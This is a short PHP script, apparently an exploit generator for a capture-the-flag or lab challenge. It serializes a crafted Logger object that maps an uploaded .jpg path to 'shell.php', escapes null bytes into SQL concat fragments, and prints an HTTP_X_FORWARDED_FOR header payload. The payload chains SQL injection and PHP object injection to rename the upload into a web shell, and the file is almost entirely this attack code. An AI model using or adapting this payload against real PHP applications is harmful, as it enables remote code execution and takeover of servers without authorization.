<?php
/**
 * Created by PhpStorm.
 * User: admin
 * Date: 2020/3/29
 * Time: 8:46
 */

class Upload
{

}
class Logger
{
    protected $err = [];
    protected $handle;
    public function __construct($up)
    {
        $this->err = array("/var/www/html/img/upload/air5f878bshuwonslz1lmtce1j9nt8zf.jpg" => "shell.php");
        $this->handle = $up;
    }
}

$upload = new Upload();
$logger = new Logger($upload);
$d = urlencode(serialize($logger));
$e = str_replace("%00","',0x00,'",$d);
echo 'HTTP_X_FORWARDED_FOR[\',data%3dconcat(\'data|'.$e.'\')%23\']=123';
echo "\n\n";

echo unserialize('s:12:"s:5:"shell";";');